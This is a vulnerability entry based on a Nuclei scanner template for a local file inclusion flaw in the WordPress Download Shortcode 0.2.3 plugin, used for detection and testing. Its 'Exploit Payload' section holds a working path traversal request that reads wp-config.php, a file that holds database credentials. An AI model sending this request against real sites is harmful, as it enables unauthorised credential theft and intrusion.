# Nuclei Template: WordPress Download Shortcode 0.2.3 - Local File Inclusion
**Template ID:** shortcode-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`shortcode-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. Prior versions may also be affected.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/force-download.php?file=../wp-config.php
```

## References
- https://packetstormsecurity.com/files/128024/WordPress-ShortCode-1.1-Local-File-Inclusion.html
